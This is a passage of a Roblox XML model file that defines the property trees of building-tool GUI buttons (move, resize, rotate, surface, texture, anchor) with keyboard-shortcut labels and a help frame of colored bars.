										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>140</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX698A35BD33494562ABA64A7F1E3762F2">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">J</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX9E992BC0450D4AF9A4D702CC09147A1C">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4294946560</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141741366</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">MoveButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXA930796AC67949D6A6BFDAEC94592CC2">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Z</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX66E8B98FFC9F4EEFA9C47FD00CC1DC2E">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4278497260</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141794324</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">ResizeButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX003996ABDF5B4A52A22678F8A3C04CA8">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">X</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBXDAD0AF8CF1A849E486C428128FC2DF94">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4283144011</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141807775</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">RotateButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX8B630085173E4235A31637085490F1FF">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">C</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX9B6E0F52E6A74E6A92BD700E2D754915">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141803491</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">SurfaceButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>70</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX8DE019B483A441E392ADFA9C7112A863">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">B</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX4DB25F2F113B4E4993DC0D6AE2A1FFD4">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141805275</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">TextureButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>175</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX5EC5661DCA8C42B28D20B002111CBB5D">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">G</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBXC513F9C7B39246ED90B62B780421D4F2">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141741323</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">AnchorButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX045DDD7E5D0F4BD4BAFCC05BD6BF570D">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">M</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX0B1704D91164442C8BA224ABBAFA77BF">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4282203453</Color3>
									<float name="BackgroundTransparency">0.200000003</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">true</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">HelpInfo</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>-120</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>120</XO>
										<YS>0</YS>
										<YO>315</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX959CEEEDC5FB4396A31540ABC3256FC1">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">BottomColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">180</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXC546497C81B3425E8CD0859F802F28BA">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294946560</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Yellow</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX1C3677BAA22642A5A6DD200DDCCD9BA8">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4283144011</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Green</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX41C545618CDB4B7BBEBAD919D7CA8508">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278497260</Color3>
											<float name="BackgroundTransparency">0.25</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Blue</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0.400000006</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0.200000003</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX3AC3D5C0D7344F50BDFF64AD4F587526">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
